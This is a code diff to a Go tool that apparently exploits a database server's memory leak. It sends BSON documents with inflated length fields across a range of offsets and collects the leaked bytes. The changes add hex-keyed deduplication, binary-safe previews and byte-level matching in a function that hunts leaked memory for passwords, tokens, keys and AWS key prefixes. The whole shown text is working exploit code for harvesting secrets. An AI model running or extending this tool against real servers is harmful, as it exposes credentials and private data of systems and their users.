@@ -12,6 +12,7 @@ import (
 	"bytes"
 	"compress/zlib"
 	"encoding/binary"
+	"encoding/hex"
 	"flag"
 	"fmt"
 	"net"
@@ -19,6 +20,7 @@ import (
 	"regexp"
 	"strings"
 	"time"
+	"unicode/utf8"
 )
 
 // sendProbe crafts and sends a malicious BSON document with inflated length
@@ -163,14 +165,37 @@ func decompressZlib(data []byte) ([]byte, error) {
 
 // isCommonField filters out common false positive field names
 func isCommonField(data []byte) bool {
-	commonFields := []string{"?", "a", "$db", "ping"}
-	s := string(data)
+	commonFields := [][]byte{
+		[]byte("?"),
+		[]byte("a"),
+		[]byte("$db"),
+		[]byte("ping"),
+	}
+	
 	for _, field := range commonFields {
-		if s == field {
+		if bytes.Equal(data, field) {
 			return true
 		}
 	}
 	return false
+}
+
+// formatPreview safely formats binary data for display
+func formatPreview(data []byte) string {
+	// If data is valid UTF-8, display as string
+	if utf8.Valid(data) {
+		preview := string(data)
+		if len(preview) > 80 {
+			preview = preview[:80]
+		}
+		return preview
+	}
+	
+	// For binary data, show hex representation
+	if len(data) > 40 {
+		return fmt.Sprintf("[binary: %d bytes] %x...", len(data), data[:40])
+	}
+	return fmt.Sprintf("[binary: %d bytes] %x", len(data), data)
 }
 
 // containsSecret checks if leaked data contains common secret patterns
@@ -178,9 +203,13 @@ func containsSecret(data []byte) []string {
 	secrets := []string{"password", "secret", "key", "token", "admin", "AKIA"}
 	found := make([]string, 0)
 	
-	lowerData := strings.ToLower(string(data))
+	// Check each secret pattern
 	for _, secret := range secrets {
-		if strings.Contains(lowerData, strings.ToLower(secret)) {
+		secretBytes := []byte(secret)
+		secretLower := []byte(strings.ToLower(secret))
+		
+		// Check for both case-sensitive and case-insensitive matches
+		if bytes.Contains(data, secretBytes) || bytes.Contains(bytes.ToLower(data), secretLower) {
 			found = append(found, secret)
 		}
 	}
@@ -205,7 +234,7 @@ func main() {
 	
 	// Scan for memory leaks
 	allLeaked := make([]byte, 0)
-	uniqueLeaks := make(map[string]bool)
+	uniqueLeaks := make(map[string]bool) // Use hex-encoded string as key for binary data
 	secretPatterns := make(map[string]bool)
 	
 	for docLen := int32(*minOffset); docLen <= int32(*maxOffset); docLen++ {
@@ -216,17 +245,15 @@ func main() {
 		
 		leaks := extractLeaks(response)
 		for _, data := range leaks {
-			dataStr := string(data)
-			if !uniqueLeaks[dataStr] {
-				uniqueLeaks[dataStr] = true
+			// Create hex-encoded key for binary deduplication (preserves exact byte sequence)
+			dataKey := hex.EncodeToString(data)
+			if !uniqueLeaks[dataKey] {
+				uniqueLeaks[dataKey] = true
 				allLeaked = append(allLeaked, data...)
 				
 				// Show interesting leaks (> 10 bytes)
 				if len(data) > 10 {
-					preview := string(data)
-					if len(preview) > 80 {
-						preview = preview[:80]
-					}
+					preview := formatPreview(data)
 					fmt.Printf("[+] offset=%4d len=%4d: %s\n", docLen, len(data), preview)
 				}
 				
